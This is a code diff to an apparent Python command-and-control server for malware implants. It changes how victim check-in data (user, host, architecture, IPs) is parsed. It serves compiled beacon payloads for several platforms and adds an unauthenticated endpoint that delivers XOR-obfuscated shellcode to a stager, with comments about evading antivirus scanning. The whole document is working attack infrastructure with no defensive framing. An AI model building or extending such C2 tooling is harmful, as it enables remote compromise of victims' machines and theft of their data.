@@ -114,9 +114,9 @@ async def handle_checkin(request: web.Request) -> web.Response:
                         # Basic parsing of sysinfo lines
                         for line in sysinfo.split("\n"):
                             if line.startswith("OS: "): info["os"] = line[4:].strip()
-                            if line.startswith("Username: "): info["user"] = line[10:].strip()
-                            if line.startswith("Architecture: "): info["arch"] = line[14:].strip()
-                            if line.startswith("Hostname: "): info["hostname"] = line[10:].strip()
+                            if line.startswith("User: "): info["user"] = line[6:].strip()
+                            if line.startswith("Arch: "): info["arch"] = line[6:].strip()
+                            if line.startswith("Host: "): info["hostname"] = line[6:].strip()
                         
                         # Basic parsing of netinfo for local IPs
                         ips = []
@@ -188,7 +188,7 @@ async def handle_payload(request: web.Request) -> web.Response:
 
         # Map route to filename
         platform_map = {
-            "/api/v1/payload": "beacon.exe",
+            "/api/v1/payload": "beacon.pe",
             "/api/v1/payload_linux": "beacon_linux",
             "/api/v1/payload_linux_x86": "beacon_linux_x86",
             "/api/v1/payload_macos": "beacon_macos",
@@ -202,26 +202,39 @@ async def handle_payload(request: web.Request) -> web.Response:
         if not os.path.exists(payload_path):
             return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
         
-        # Professional Evasion: XOR encrypt the payload before sending
-        # This prevents AV from scanning the file while it's in transit.
         with open(payload_path, "rb") as f:
             data = f.read()
         
-        # Use a simple XOR key (0xAA) - for production, this would be randomized
-        encrypted_data = bytes([b ^ 0xAA for b in data])
-        
-        return web.Response(body=encrypted_data, content_type="application/octet-stream")
+        return web.Response(body=data, content_type="application/octet-stream")
     except Exception as e:
         logger.error(f"Payload delivery error: {e}")
+        return web.Response(status=500)
+
+
+async def handle_payload_pic(request: web.Request) -> web.Response:
+    """GET /x — Serves the XOR-encrypted beacon.bin (PIC shellcode).
+    No auth required — the payload is XOR-obfuscated with a static key
+    embedded in the stager, so it is useless without the decryptor script.
+    """
+    try:
+        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon_xored.bin")
+        if not os.path.exists(payload_path):
+            return web.Response(text="Payload not compiled yet.", status=404)
+        with open(payload_path, "rb") as f:
+            data = f.read()
+        return web.Response(body=data, content_type="application/octet-stream")
+    except Exception as e:
+        logger.error(f"PIC payload delivery error: {e}")
         return web.Response(status=500)
 
 
 # ── Server Lifecycle ───────────────────────────────────────────────────────
 
 class C2Server:
-    def __init__(self, host: str = "0.0.0.0", port: int = 443):
+    def __init__(self, host: str = "0.0.0.0", port: int = 8080, use_ssl: bool = False):
         self.host = host
         self.port = port
+        self.use_ssl = use_ssl
         self.ssl_context: Optional[ssl.SSLContext] = None
         self.runner: Optional[web.AppRunner] = None
         self.site: Optional[web.TCPSite] = None
@@ -229,7 +242,10 @@ class C2Server:
         self.thread: Optional[threading.Thread] = None
 
     def _get_ssl_context(self) -> Optional[ssl.SSLContext]:
-        """Load or generate SSL context for HTTPS support."""
+        """Load or generate SSL context for HTTPS support. Returns None for HTTP."""
+        if not self.use_ssl:
+            return None
+            
         cert_dir = os.path.join(os.getcwd(), "data", "certs")
         os.makedirs(cert_dir, exist_ok=True)
         cert_path = os.path.join(cert_dir, "server.crt")
@@ -305,7 +321,7 @@ class C2Server:
         return None
 
     def _setup_app(self) -> web.Application:
-        app = web.Application()
+        app = web.Application(client_max_size=50*1024*1024)
         # Check-in: Support malleable URIs
         app.router.add_get("/api/v1/ping", handle_checkin)
         app.router.add_post("/api/v1/ping", handle_checkin)
@@ -327,6 +343,8 @@ class C2Server:
         app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
         app.router.add_get("/api/v1/payload_macos", handle_payload)
         app.router.add_get("/api/v1/payload_android", handle_payload)
+        # Ultra-compact PIC stager endpoint (XOR-encrypted beacon.bin)
+        app.router.add_get("/x", handle_payload_pic)
         return app
 
     def _start_server(self) -> None:
@@ -339,7 +357,7 @@ class C2Server:
         # Determine if we should use SSL
         self.ssl_context = self._get_ssl_context()
         
-        self.runner = web.AppRunner(self.app, access_log=None)
+        self.runner = web.AppRunner(self.app, access_log=None, client_max_size=50*1024*1024)
         self.loop.run_until_complete(self.runner.setup())
         
         # Fix: Always bind to 0.0.0.0 to avoid OSError 10049 if host is non-local
@@ -352,13 +370,17 @@ class C2Server:
         logger.info(f"C2 Async Server ({proto}) started on {bind_host}:{self.port}")
         self.loop.run_forever()
 
-    def start(self, host: Optional[str] = None, port: Optional[int] = None) -> None:
+    def start(self, host: Optional[str] = None, port: Optional[int] = None, use_ssl: Optional[bool] = None) -> None:
         if self.thread and self.thread.is_alive():
             return
         if host:
             self.host = host
         if port:
             self.port = port
+        if use_ssl is not None:
+            self.use_ssl = use_ssl
+        # Re-create SSL context if use_ssl changed
+        self.ssl_context = self._get_ssl_context()
         self.thread = threading.Thread(target=self._start_server, daemon=True)
         self.thread.start()
 
